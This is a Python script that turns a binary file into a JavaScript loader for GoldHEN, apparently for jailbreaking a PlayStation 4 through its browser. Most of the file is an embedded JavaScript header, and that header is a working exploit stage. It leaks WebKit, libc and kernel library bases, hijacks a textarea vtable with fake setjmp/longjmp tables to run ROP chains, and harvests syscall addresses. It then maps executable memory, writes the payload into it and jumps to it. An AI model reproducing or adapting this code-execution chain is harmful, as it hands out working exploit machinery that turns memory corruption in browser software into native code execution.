#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
bin2js_full.py
Usage:
  python3 bin2js_full.py input.bin goldhen.js [start_index]

Behavior:
- Converts input.bin -> payload_writer[...] = 0xXXXXXXXX; (32-bit little-endian words)
- Pads to 4 bytes.
- Page-aligns allocation size (0x1000) and replaces the sizes in the header (syscall + arrayFromAddress).
- Writes a goldhen-style JS file with the exact header/footer you provided and the generated payload_writer lines inserted.
- Overwrites the output JS filename given (no second JS needed).
"""

import sys, struct
from pathlib import Path

PAGE = 0x1000

HEADER = r"""var stagegold1 = function () {
	p = window.prim;
	var textArea = document.createElement("textarea");
	var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
	var textAreaVtable = p.read8(textAreaVtPtr);
	var webKitBase = p.read8(textAreaVtable).sub32(libwk_first_vt_entry_offset);
	window.nogc.push(textArea);

	window.gadgets = {};

	for (var gadgetname in gadgetcache) {
		if (gadgetcache.hasOwnProperty(gadgetname)) {
			window.gadgets[gadgetname] = webKitBase.add32(gadgetcache[gadgetname]);
		}
	}

	var o2wk = function (o) {
		return webKitBase.add32(o);
	}
	gadgets2 = {
		"stack_chk_fail": o2wk(0x24C8),
		"memset": o2wk(0x24E8)
	};

	p.malloc = function malloc(sz) {
		var backing = new Uint8Array(0x10000 + sz);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(0x10));
		ptr.backing = backing;
		return ptr;
	}

	p.malloc32 = function malloc32(sz) {
		var backing = new Uint8Array(0x10000 + sz * 4);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(0x10));
		ptr.backing = new Uint32Array(backing.buffer);
		return ptr;
	}
	p.arrayFromAddress = function (addr) {
		var arr_i = new Uint32Array(0x1000);
		var arr_ii = p.leakval(arr_i).add32(0x10);

		p.write8(arr_ii, addr);
		p.write4(arr_ii.add32(8), 0x40000);

		nogc.push(arr_i);
		return arr_i;
	}
	var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets2.memset));

	window.libSceLibcInternalBase = libSceLibcInternalBase;
	libSceLibcInternalBase.low &= 0xFFFFC000;
	libSceLibcInternalBase.sub32inplace(libcint_memset_page_offset);

	var libKernelBase = p.read8(get_jmptgt(gadgets2.stack_chk_fail));
	window.libKernelBase = libKernelBase;
	libKernelBase.low &= 0xFFFFC000;
	libKernelBase.sub32inplace(libk_stack_chk_fail_page_offset);

	var setjmpFakeVtable = p.malloc32(0x200);
	var longjmpFakeVtable = p.malloc32(0x200);

	var original_context = p.malloc32(0x40);
	var modified_context = p.malloc32(0x40);

	p.write8(setjmpFakeVtable.add32(0x0), setjmpFakeVtable);
	p.write8(setjmpFakeVtable.add32(0xA8), webKitBase.add32(setJmpGadget_two)); // mov rdi, [rdi + 0x10] ; jmp qword ptr [rax + 8]
	p.write8(setjmpFakeVtable.add32(0x10), original_context);
	p.write8(setjmpFakeVtable.add32(0x8), libSceLibcInternalBase.add32(setJmpOffset));
	p.write8(setjmpFakeVtable.add32(0x1D8), webKitBase.add32(setJmpGadget_one)); //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]

	p.write8(longjmpFakeVtable.add32(0x0), longjmpFakeVtable);
	p.write8(longjmpFakeVtable.add32(0xA8), webKitBase.add32(longJmpGadget_two)); // mov rdi, [rdi + 0x10] ; jmp qword ptr [rax + 8]
	p.write8(longjmpFakeVtable.add32(0x10), modified_context);
	p.write8(longjmpFakeVtable.add32(0x8), libSceLibcInternalBase.add32(longJmpOffset));
	p.write8(longjmpFakeVtable.add32(0x1D8), webKitBase.add32(longJmpGadget_one)); //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]

	var launch_chain = function (chain) {


		chain.push(window.gadgets["pop rdi"]);
		chain.push(original_context);
		chain.push(libSceLibcInternalBase.add32(longJmpOffset)); // longjmp


		p.write8(textAreaVtPtr, setjmpFakeVtable);
		textArea.scrollLeft = 0;
		p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
		p.write8(modified_context.add32(0x10), chain.stack); // RSP = ropStack

		p.write8(textAreaVtPtr, longjmpFakeVtable);
		textArea.scrollLeft = 0;
	}

	p.loadchain = launch_chain;

	var kview = new Uint8Array(0x1000);
	var kstr = p.leakval(kview).add32(0x10);
	var orig_kview_buf = p.read8(kstr);

	p.write8(kstr, window.libKernelBase);
	p.write4(kstr.add32(8), 0x40000);

	var countbytes;
	for (var i = 0; i < 0x40000; i++) {
		if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
			countbytes = i;
			break;
		}
	}
	p.write4(kstr.add32(8), countbytes + 32);

	var dview32 = new Uint32Array(1);
	var dview8 = new Uint8Array(dview32.buffer);
	for (var i = 0; i < countbytes; i++) {
		if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
			dview8[0] = kview[i + 3];
			dview8[1] = kview[i + 4];
			dview8[2] = kview[i + 5];
			dview8[3] = kview[i + 6];
			var syscallno = dview32[0];
			window.syscalls[syscallno] = window.libKernelBase.add32(i);
		}
	}
	var chain = new rop();
	var returnvalue;

	p.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
		chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

		chain.push(window.gadgets["pop rdi"]);
		chain.push(chain.retval);
		chain.push(window.gadgets["mov [rdi], rax"]);

		chain.run();
		returnvalue = p.read8(chain.retval);
		return returnvalue;
	}

	p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {

		return p.fcall(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
	}

	p.stringify = function (str) {
		var bufView = new Uint8Array(str.length + 1);
		for (var i = 0; i < str.length; i++) {
			bufView[i] = str.charCodeAt(i) & 0xFF;
		}
		window.nogc.push(bufView);
		return p.read8(p.leakval(bufView).add32(0x10));
	};

	var spawn_thread = function (name, chaino) {
		var new_thr = new rop();
		var context = p.malloc(0x100);

		p.write8(context.add32(0x0), window.gadgets["ret"]);
		p.write8(context.add32(0x10), new_thr.stack);
		new_thr.push(window.gadgets["ret"]);
		chaino(new_thr);
		p.write8(context, window.gadgets["ret"]);
		p.write8(context.add32(0x10), new_thr.stack);

		var retv = function () {
			p.fcall(libKernelBase.add32(pthread_create_np_offset), context.add32(0x48), 0, libSceLibcInternalBase.add32(longJmpOffset), context, p.stringify(name));
		}
		window.nogc.push(new_thr);
		window.nogc.push(context);

		return retv;
	}
		var payload_buffer = p.syscall(477, 0, 0x300000, 7, 0x41000, -1, 0);
        var payload_writer = p.arrayFromAddress(payload_buffer, 0xC0000);

"""

FOOTER = r"""



//hier payloadwirter


p.fcall(payload_buffer);
window.progress.innerHTML="<div>GoldHEN Loaded</div>";
}
"""

def page_align(x, page=PAGE):
    return ((x + page - 1) // page) * page

def bin_to_words_le(data):
    pad = (-len(data)) % 4
    if pad:
        data = data + b'\x00' * pad
    words = []
    for i in range(0, len(data), 4):
        (w,) = struct.unpack_from('<I', data, i)
        words.append(w)
    return words, len(data) + pad

def make_assigns(words, start_index=0):
    lines = []
    idx = start_index
    for w in words:
        lines.append(f"payload_writer[{idx}] = 0x{w:08X};")
        idx += 1
    return lines

def replace_sizes_in_header(header, alloc_size, array_size):
    # replace the 0x300000 and 0xC0000 occurrences in the header with computed hex values
    h = header
    h = h.replace("p.syscall(477, 0, 0x300000", f"p.syscall(477, 0, 0x{alloc_size:X}")
    h = h.replace("p.arrayFromAddress(payload_buffer, 0xC0000)", f"p.arrayFromAddress(payload_buffer, 0x{array_size:X})")
    return h

def main():
    if not (3 <= len(sys.argv) <= 4):
        print("Usage: python3 bin2js_full.py input.bin goldhen.js [start_index]")
        sys.exit(2)

    binp = Path(sys.argv[1])
    outjs = Path(sys.argv[2])
    start_index = int(sys.argv[3]) if len(sys.argv) == 4 else 0

    if not binp.exists():
        print("Error: input.bin not found.")
        sys.exit(1)

    data = binp.read_bytes()
    words, padded_len = bin_to_words_le(data)
    alloc_size = page_align(padded_len, PAGE)
    # arrayFromAddress second arg often is number of u32 entries -> choose alloc_size/4
    array_entries = alloc_size // 4

    assigns = make_assigns(words, start_index=start_index)

    header = replace_sizes_in_header(HEADER, alloc_size, array_entries)
    # Build final content: header + assigns + footer (footer contains same marker as provided)
    # We will replace the placeholder comment in FOOTER (//hier payloadwirter) with the assigns.
    if "//hier payloadwirter" in FOOTER:
        footer_with_assigns = FOOTER.replace("//hier payloadwirter", "\n".join(assigns))
        content = header + footer_with_assigns
    else:
        # safe fallback: append assigns between header and footer
        content = header + "\n".join(assigns) + FOOTER

    outjs.write_text(content, encoding='utf-8', newline='\n')
    print(f"Wrote {outjs} — {len(assigns)} payload_writer entries, binary {len(data)} bytes (padded {padded_len}), alloc_size=0x{alloc_size:X}, array_entries=0x{array_entries:X}.")

if __name__ == "__main__":
    main()
